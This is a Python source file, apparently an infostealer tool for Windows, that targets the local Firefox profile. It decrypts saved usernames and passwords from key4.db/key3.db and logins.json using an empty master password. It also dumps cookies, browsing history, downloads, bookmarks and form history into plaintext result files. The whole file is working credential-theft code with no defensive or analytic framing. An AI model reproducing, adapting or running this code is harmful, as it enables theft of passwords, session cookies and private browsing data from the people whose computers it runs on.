import os,json,base64,sqlite3,win32crypt,shutil,click,re,random,hmac
from pyasn1.codec.der import decoder;from hashlib import sha1,pbkdf2_hmac
from struct import unpack;from binascii import hexlify,unhexlify
from rich.console import Console;from rich.table import Table;from rich.theme import Theme
from Crypto.Cipher import DES3,AES;from Crypto.Util.number import long_to_bytes;from Crypto.Util.Padding import unpad 
from time import sleep,localtime
if os.name=='nt':pass
else:exit(f'[!] Sorry, Your System is Not Supported - {os.name}')
custom_theme=Theme({'success': 'green', 'error': 'bold red'})
console=Console(theme=custom_theme)

def Firefox_Login():
    done=50
    oidValues={b'2a864886f70d010c050103': '1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC',b'2a864886f70d0307':'1.2.840.113549.3.7 des-ede3-cbc',b'2a864886f70d010101':'1.2.840.113549.1.1.1 pkcs-1',b'2a864886f70d01050d':'1.2.840.113549.1.5.13 pkcs5 pbes2', b'2a864886f70d01050c':'1.2.840.113549.1.5.12 pkcs5 PBKDF2',b'2a864886f70d0209':'1.2.840.113549.2.9 hmacWithSHA256',b'60864801650304012a':'2.16.840.1.101.3.4.1.42 aes256-CBC'}   
    CKA_ID=unhexlify('f8000000000000000000000000000001')
    def getShortLE(d,a):return unpack('<H',(d)[a:a+2])[0]
    def getLongBE(d,a):return unpack('>L',(d)[a:a+4])[0] 
    def printASN1(d,l,rl):
        type=d[0]
        length=d[1]
        if length&0x80 > 0: 
            nByteLength=length&0x7f
            length=d[2]  
            skip=1
        else:
            skip=0    
        if type==0x30:
            seqLen=length
            readLen=0
            while seqLen>0:
                len2=printASN1(d[2+skip+readLen:], seqLen, rl+1)
                seqLen=seqLen-len2
                readLen=readLen+len2
            return length+2
        elif type==6:
            oidVal=hexlify(d[2:2+length]) 
            if oidVal in oidValues:pass
            else:done=0
            return length+2
        elif type==4: 
            return length+2
        elif type==5: 
            return length+2
        elif type==2: 
            return length+2
        else:
            if length==l-2:
                return length        
    def readBsddb(name):   
        f=open(name,'rb')
        header=f.read(4*15)
        magic=getLongBE(header,0)
        if magic != 0x61561:done=0
        version=getLongBE(header,4)
        if version !=2:done=0
        pagesize=getLongBE(header,12)
        nkeys=getLongBE(header,0x38) 
        readkeys=0
        page=1
        nval=0
        val=1
        db1=[]
        while (readkeys < nkeys):
            f.seek(pagesize*page)
            offsets=f.read((nkeys+1)* 4 +2)
            offsetVals=[]
            i=0
            nval=0
            val=1
            keys=0
            while nval != val:
                keys+=1
                key=getShortLE(offsets,2+i)
                val=getShortLE(offsets,4+i)
                nval=getShortLE(offsets,8+i)
                offsetVals.append(key+ pagesize*page)
                offsetVals.append(val+ pagesize*page)  
                readkeys+=1
                i+=4
            offsetVals.append(pagesize*(page+1))
            valKey=sorted(offsetVals)  
            for i in range( keys*2 ):
                f.seek(valKey[i])
                data=f.read(valKey[i+1]-valKey[i])
                db1.append(data)
            page+=1
        f.close()
        db={}
        for i in range( 0, len(db1), 2):
            db[ db1[i+1] ] = db1[ i ]
        return db  
    def decryptMoz3DES(globalSalt,masterPassword,entrySalt,encryptedData):
        hp=sha1(globalSalt+masterPassword).digest()
        pes=entrySalt+b'\x00'*(20-len(entrySalt))
        chp=sha1( hp+entrySalt ).digest()
        k1=hmac.new(chp, pes+entrySalt, sha1).digest()
        tk=hmac.new(chp, pes, sha1).digest()
        k2=hmac.new(chp, tk+entrySalt, sha1).digest()
        k=k1+k2
        iv=k[-8:]
        key=k[:24]
        return DES3.new(key,DES3.MODE_CBC,iv).decrypt(encryptedData)
    def decodeLoginData(data):
        asn1data=decoder.decode(base64.b64decode(data)) 
        key_id=asn1data[0][0].asOctets()
        iv=asn1data[0][1][1].asOctets()
        ciphertext=asn1data[0][2].asOctets()
        return key_id,iv,ciphertext 
    def getLoginData():
        logins=[]
        sqlite_file=main_db+'\signons.sqlite'
        json_file=main_db+'\logins.json'
        if 'logins.json' in os.listdir(main_db):
            loginf=open(json_file,'r').read()
            jsonLogins=json.loads(loginf)
            if 'logins' not in jsonLogins:return []
            for row in jsonLogins['logins']:
                encUsername=row['encryptedUsername']
                encPassword=row['encryptedPassword']
                logins.append((decodeLoginData(encUsername),decodeLoginData(encPassword),row['hostname']))
            return logins  
        if 'signons.sqlite' in os.listdir(main_db): 
            conn=sqlite3.connect(sqlite_file)
            c=conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername=row[6]
                encPassword=row[7]
                logins.append((decodeLoginData(encUsername),decodeLoginData(encPassword),row[1]))
            return logins
        else:done=0
    def extractSecretKey(masterPassword,keyData):
        pwdCheck=keyData[b'password-check']
        entrySaltLen=pwdCheck[1]
        entrySalt=pwdCheck[3: 3+entrySaltLen]
        encryptedPasswd=pwdCheck[-16:]
        globalSalt=keyData[b'global-salt']
        cleartextData = decryptMoz3DES( globalSalt, masterPassword, entrySalt, encryptedPasswd )
        if cleartextData != b'password-check\x02\x02':done=0
        if CKA_ID not in keyData:return None
        privKeyEntry=keyData[CKA_ID]
        saltLen=privKeyEntry[1]
        nameLen=privKeyEntry[2]
        privKeyEntryASN1=decoder.decode(privKeyEntry[3+saltLen+nameLen:])
        data=privKeyEntry[3+saltLen+nameLen:]
        entrySalt=privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData=privKeyEntryASN1[0][1].asOctets()
        privKey=decryptMoz3DES(globalSalt,masterPassword,entrySalt,privKeyData) 
        privKeyASN1=decoder.decode(privKey)
        prKey=privKeyASN1[0][2].asOctets()
        prKeyASN1=decoder.decode(prKey)
        id=prKeyASN1[0][1]
        key=long_to_bytes(prKeyASN1[0][3])
        return key
    def decryptPBE(decodedItem,masterPassword,globalSalt):
        pbeAlgo=str(decodedItem[0][0][0])
        if pbeAlgo=='1.2.840.113549.1.12.5.1.3':
            entrySalt=decodedItem[0][0][1][0].asOctets()
            cipherT=decodedItem[0][1].asOctets()
            key=decryptMoz3DES(globalSalt,masterPassword,entrySalt,cipherT)
            return key[:24],pbeAlgo
        elif pbeAlgo=='1.2.840.113549.1.5.13':
            assert str(decodedItem[0][0][1][0][0])=='1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3][0])=='1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0])=='2.16.840.1.101.3.4.1.42'
            entrySalt=decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount=int(decodedItem[0][0][1][0][1][1])
            keyLength=int(decodedItem[0][0][1][0][1][2])
            assert keyLength==32 
            k=sha1(globalSalt+masterPassword).digest()
            key=pbkdf2_hmac('sha256',k,entrySalt,iterationCount,dklen=keyLength)    
            iv=b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT=decodedItem[0][1].asOctets()
            clearText=AES.new(key,AES.MODE_CBC,iv).decrypt(cipherT)
            return clearText,pbeAlgo
    def getKey(masterPassword):  
        if 'key4.db' in os.listdir(main_db):
            conn=sqlite3.connect(main_db+'\key4.db')
            c=conn.cursor()
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row=c.fetchone()
            globalSalt=row[0]
            item2=row[1]
            decodedItem2=decoder.decode(item2) 
            clearText,algo=decryptPBE( decodedItem2, masterPassword, globalSalt)
            if clearText==b'password-check\x02\x02': 
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:break
                a11=row[0]
                a102=row[1] 
                if a102==CKA_ID: 
                    decoded_a11=decoder.decode(a11)
                    clearText,algo=decryptPBE(decoded_a11,masterPassword,globalSalt)
                    return clearText[:24],algo
                else:done=0     
            return None,None
        elif 'key3.db' in os.listdir(main_db):
            keyData=readBsddb(main_db+'\key3.db')
            key=extractSecretKey(masterPassword,keyData)
            return key,'1.2.840.113549.1.12.5.1.3'
        else:
            done=0
            return None,None
    try:
        temp_db=os.getenv('APPDATA')+"\\Mozilla\\Firefox\\Profiles\\"
        for name in os.listdir(temp_db):main_db=temp_db+name
        masterPassword=''
        key,algo=getKey(masterPassword.encode())
        if key==None:done=0
        logins=getLoginData()
        if len(logins)==0:print('no stored passwords');done=1
        if algo=='1.2.840.113549.1.12.5.1.3' or algo=='1.2.840.113549.1.5.13':  
            t=0
            for i in logins:
                assert i[0][0]==CKA_ID
                iv=i[0][1]
                ciphertext=i[0][2] 
                iv2=i[1][1]
                ciphertext2=i[1][2] 
                host=str(i[2]) 
                username=unpad(DES3.new(key,DES3.MODE_CBC,iv).decrypt(ciphertext),8);username=re.findall("b'(.*?)'",str(username))[0]
                password=unpad(DES3.new(key,DES3.MODE_CBC,iv2).decrypt(ciphertext2),8);password=re.findall("b'(.*?)'",str(password))[0]
                data="Username: "+username+"\nPassword: "+password+"\nHost: "+host+"\n"+"-"*50+"\n" 
                with open('Results/Mozilla Firefox/Firefox_Login.txt','a',encoding="utf-8") as f:f.write(data)
                t+=1
            with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Logins:{t}:✅\n')
            console.print("[+] We have [success]succeeded[/success] in extracting the logins of Mozilla Firefox !")
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Logins:{t}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox logins  ! ",e);pass
        
def Firefox_Cookies(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\cookies.sqlite","Temp/Firefox_cookies.db")
        conn=sqlite3.connect('Temp/Firefox_cookies.db');cursor=conn.cursor()
        cursor.execute("select id,name,value,host from moz_cookies;")
        for id,name,value,host in cursor.fetchall():
            data=f"ID: {id}"+"\nHost: "+host+"\nName: "+name+"\nValue: "+value+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_Cookies.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Cookies:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the cookies of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Cookies:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox cookies  ! ");pass
    
def Firefox_History(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\places.sqlite","Temp/Firefox_History.db")
        conn=sqlite3.connect('Temp/Firefox_History.db');cursor=conn.cursor()
        cursor.execute("select id,url,title from moz_places;")
        for id,url,title in cursor.fetchall():
            if title==None:title='Null'
            data=f"ID: {id}"+"\nTitle: "+title+"\nURL: "+url+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_History.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox History:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the history of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox History:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox history  ! ");pass
    
def Firefox_Downloads(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\places.sqlite","Temp/Firefox_Downloads.db")
        conn=sqlite3.connect('Temp/Firefox_Downloads.db');cursor=conn.cursor()
        cursor.execute("select content from moz_annos;")
        for content in cursor.fetchall():
            data=f"Content: "+str(content)+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_Downloads.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Downloads:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Downloads of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Downloads:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox Downloads  ! ");pass

def Firefox_Bookmarks(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+"\places.sqlite","Temp/Firefox_Bookmarks.db")
        conn=sqlite3.connect('Temp/Firefox_Bookmarks.db');cursor=conn.cursor()
        cursor.execute("select id,title from moz_bookmarks;")
        for id,title in cursor.fetchall():
            if title==None or title=='':pass
            data="Title: "+title+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_Bookmarks.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Bookmarks:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the Bookmarks of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox Bookmarks:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox Bookmarks  ! ");pass

def Firefox_lastsearch(main_db2):
    try:
        i=0
        shutil.copy2(main_db2+r"\formhistory.sqlite","Temp/Firefox_LastSearch.db")
        conn=sqlite3.connect('Temp/Firefox_LastSearch.db');cursor=conn.cursor()
        cursor.execute("select fieldname,value from moz_formhistory;")
        for fieldname,value in cursor.fetchall():
            data=f"Value: {value}\nFieldName: {fieldname}"+"\n"+"-"*50+"\n" 
            with open('Results/Mozilla Firefox/Firefox_LastSearch.txt','a',encoding="utf-8") as f:f.write(data)
            i+=1
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox lastsearch:{i}:✅\n')
        console.print("[+] We have [success]succeeded[/success] in extracting the LastSearch of Mozilla Firefox !")
        cursor.close();conn.close()
    except Exception as e:
        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox lastsearch:{i}:❌\n')
        console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox LastSearch  ! ");pass
